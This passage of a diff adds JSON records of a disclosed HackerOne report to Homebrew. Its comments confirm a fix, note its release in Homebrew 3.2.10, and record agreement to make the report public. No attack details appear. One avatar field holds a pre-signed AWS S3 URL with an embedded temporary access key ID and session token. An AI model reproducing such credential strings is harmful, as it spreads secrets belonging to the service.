Amz-Signature=b2cb238a2b3be66a678f38cd4644566271f9213b0d320b9eabd13122c9fdb1f2"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "gedwards",
+        "url": "/gedwards"
+      },
+      "genius_execution_id": null,
+      "team_handle": "homebrew"
+    },
+    {
+      "id": 13188822,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks! The fix looks good to me, verified on my system in developer mode, and I'm glad the pty solution works so far. Would you want to disclose this report some time after the fix is released, assuming it doesn't need to be reverted?",
+      "automated_response": false,
+      "created_at": "2021-08-27T00:56:04.505Z",
+      "updated_at": "2021-08-27T00:56:04.505Z",
+      "actor": {
+        "username": "gedwards",
+        "cleared": false,
+        "verified": false,
+        "url": "/gedwards",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "homebrew"
+    },
+    {
+      "id": 13231993,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "Sounds good. Have released in Homebrew 3.2.10 now.",
+      "automated_response": false,
+      "created_at": "2021-08-30T14:43:56.717Z",
+      "updated_at": "2021-08-30T14:43:56.717Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "mikemcquaid",
+        "cleared": false,
+        "verified": false,
+        "url": "/mikemcquaid",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/rwqfvd8y58p42weq9cq5q3j52jij/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22Me.jpg%22%3B%20filename%2A%3DUTF-8%27%27Me.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070930Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b2cb238a2b3be66a678f38cd4644566271f9213b0d320b9eabd13122c9fdb1f2"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "homebrew"
+    },
+    {
+      "id": 13240390,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "Great, thank you!",
+      "automated_response": false,
+      "created_at": "2021-08-30T23:46:16.553Z",
+      "updated_at": "2021-08-30T23:46:16.553Z",
+      "actor": {
+        "username": "gedwards",
+        "cleared": false,
+        "verified": false,
+        "url": "/gedwards",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "homebrew"
+    },
+    {
+      "id": 13240391,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-08-30T23:46:16.657Z",
+      "updated_at": "2021-08-30T23:46:16.657Z",
+      "actor": {
+        "username": "gedwards",
+        "cleared": false,
+        "verified": false,
+        "url": "/gedwards",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "homebrew"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
